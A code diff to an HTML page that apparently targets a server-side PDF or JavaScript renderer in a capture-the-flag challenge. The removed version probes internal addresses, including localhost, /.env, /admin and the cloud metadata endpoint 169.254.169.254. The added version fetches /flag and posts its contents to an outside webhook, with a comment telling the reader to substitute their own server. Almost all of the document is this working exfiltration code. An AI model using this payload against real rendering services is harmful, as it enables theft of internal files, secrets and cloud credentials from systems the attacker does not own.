@@ -2,51 +2,54 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Fetch Test</title>
+  <title>Exploit PDF JS Renderer</title>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 2em; background: #111; color: #eee; }
+    h1 { color: #f66; }
+    pre { background: #222; padding: 1em; border-radius: 6px; overflow-x: auto; max-height: 300px; }
+    #status { margin-top: 1em; font-weight: bold; }
+  </style>
 </head>
 <body>
-  <div id="results"></div>
+  <h1>Trying to exfiltrate internal data</h1>
+  <p>This page will try to fetch <code>/flag</code> and send it back to my server.</p>
+  <pre id="log">Starting...</pre>
+  <div id="status"></div>
 
   <script>
-    const paths = [
-      "http://127.0.0.1/",
-      "http://localhost/",
-      "/flag",
-      "/admin",
-      "/admin/secret",
-      "/.env",
-      "/config",
-      "http://169.254.169.254/latest/meta-data/"
-    ];
+    (async () => {
+      const logEl = document.getElementById('log');
+      const statusEl = document.getElementById('status');
+      const webhookUrl = 'https://jakovkatz.github.io/ctf/log'; // <-- החלף לכתובת שלך
 
-    const resultsDiv = document.getElementById("results");
+      function log(msg) {
+        logEl.textContent += '\n' + msg;
+        console.log(msg);
+      }
 
-    for (const path of paths) {
-      fetch(path)
-        .then(r => r.text())
-        .then(t => {
-          const box = document.createElement("div");
-          box.style.border = "1px solid black";
-          box.style.margin = "10px";
-          box.style.padding = "10px";
-          box.innerHTML = `
-            <h3>${path}</h3>
-            <pre>${t.slice(0, 1000)}</pre>
-          `;
-          resultsDiv.appendChild(box);
-        })
-        .catch(err => {
-          const fail = document.createElement("div");
-          fail.style.border = "1px dashed gray";
-          fail.style.margin = "10px";
-          fail.style.padding = "10px";
-          fail.innerHTML = `
-            <h3>❌ ${path}</h3>
-            <pre>${err}</pre>
-          `;
-          resultsDiv.appendChild(fail);
+      try {
+        log('Fetching /flag...');
+        const response = await fetch('/flag');
+        if (!response.ok) throw new Error('Fetch failed with status ' + response.status);
+        const flag = await response.text();
+        log('Flag content retrieved:');
+        log(flag.slice(0, 500)); // מציג עד 500 תווים
+
+        log('Sending data to webhook...');
+        const sendResp = await fetch(webhookUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ flag })
         });
-    }
+        if (!sendResp.ok) throw new Error('Webhook POST failed with status ' + sendResp.status);
+
+        statusEl.textContent = '✅ Data sent successfully!';
+        log('Done.');
+      } catch (err) {
+        statusEl.textContent = '❌ Error: ' + err.message;
+        log('Error: ' + err.message);
+      }
+    })();
   </script>
 </body>
 </html>
